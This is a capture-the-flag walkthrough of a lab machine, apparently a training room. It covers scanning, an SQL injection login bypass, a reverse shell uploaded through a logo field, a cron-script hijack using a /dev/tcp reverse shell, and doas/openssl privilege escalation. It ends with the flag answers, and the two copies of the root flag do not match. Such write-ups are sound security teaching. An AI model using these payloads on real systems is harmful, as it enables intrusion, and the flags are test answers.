# Task 1 Compromise
----

>>Happy Hunting!

>> Tip: Enumeration is key!

## SCANNING

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ nmap -sC -sV 10.10.166.21  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 10:04 EST
Nmap scan report for 10.10.166.21
Host is up (0.24s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a3:6a:9c:b1:12:60:b2:72:13:09:84:cc:38:73:44:4f (RSA)
|   256 b9:3f:84:00:f4:d1:fd:c8:e7:8d:98:03:38:74:a1:4d (ECDSA)
|_  256 d0:86:51:60:69:46:b2:e1:39:43:90:97:a6:af:96:93 (ED25519)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.57 seconds

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ gobuster dir -u http://10.10.166.21   -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.166.21
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/24 10:17:15 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 312] [--> http://10.10.166.21/admin/]
/shadow               (Status: 200) [Size: 25]                                  
/passwd               (Status: 200) [Size: 25] 

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ echo -n 'VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE' | base64 -d
Trust me it is not this easy..now get back to enumeration :D   

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ echo -n 'bm90IHRoaXMgZWFzeSA6RA==' | base64 -d
not this easy :D     

# This is the url we need to attack 'http://10.10.166.21:445/management/'

Quote of the Day

Baseball is like driving, it's the one who gets home safely that counts.
- Tommy Lasorda

# There is a login page which has the sql injection vulnerability using the 
Username: admin'OR 1=1-- -'
Password: anything you wanted 
now we can go into the admin portal

# Go to the setting and there is a select logo tab where we can upload the file , So we can upload a reverse shell. After uploadin the shell click on the update tab to get a shell.
```

## GETTING A SHELL

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ nc -lvnp 7007
listening on [any] 7007 ...
connect to [10.9.2.193] from (UNKNOWN) [10.10.166.21] 43256
Linux plotted 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 15:46:44 up 47 min,  0 users,  load average: 1.50, 1.26, 1.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ which python3
/usr/bin/python3
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@plotted:/$ ^Z
zsh: suspended  nc -lvnp 7007
                                                                                                                             
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ stty raw -echo && fg                                     
[1]  + continued  nc -lvnp 7007

www-data@plotted:/$ export TERM=xterm
```

## PRIVILEGE ESCALATION

```bash
www-data@plotted:/home/plot_admin$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   plot_admin /var/www/scripts/backup.sh
#

# Remove the backup.sh in the /var/www/scripts directory cause it is not writable so we are creating a new backup.sh file which contains the reverse shell which gives us the shell.

# This is the payload in the backup.sh that we created , append it into the file and wait for shell.

#!/bin/bash
/bin/sh -i >& /dev/tcp/10.9.2.193/8888 0>&1

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ nc -lvnp 8888             
listening on [any] 8888 ...
connect to [10.9.2.193] from (UNKNOWN) [10.10.166.21] 33462
bash: cannot set terminal process group (29985): Inappropriate ioctl for device
bash: no job control in this shell
plot_admin@plotted:~$ 
plot_admin@plotted:~$ ls
ls
tms_backup
user.txt
plot_admin@plotted:~$ cat user.txt
cat user.txt
77927510d5edacea1f9e86602f1fbadb

# Using the command below to find the area to escalate our privilege
find / -type f -perm /4000 -ls 2>/dev/null

plot_admin@plotted:~$ find / -type f -perm /4000 -ls 2>/dev/null

# we found /usr/bin/doas unusual suid.

plot_admin@plotted:~$ cat /etc/doas.conf 
permit nopass plot_admin as root cmd openssl

# We can see run openssl with no password

plot_admin@plotted:~$ file=/root/root.txt
plot_admin@plotted:~$ doas openssl enc -in "$file"
Congratulations on completing this room!
53f85e2da3e874426fa05904a9bdcab
Do let me know if you have any ideas/suggestions for future rooms.
-sa.infinity8888
```

# ANSWER THE QUESTIONS 
----

1.What is user.txt?
>>77927510d5edacea1f9e86602f1fbadb

2.What is root.txt?
>>53f85e2da3e874426fa059040a9bdcab

----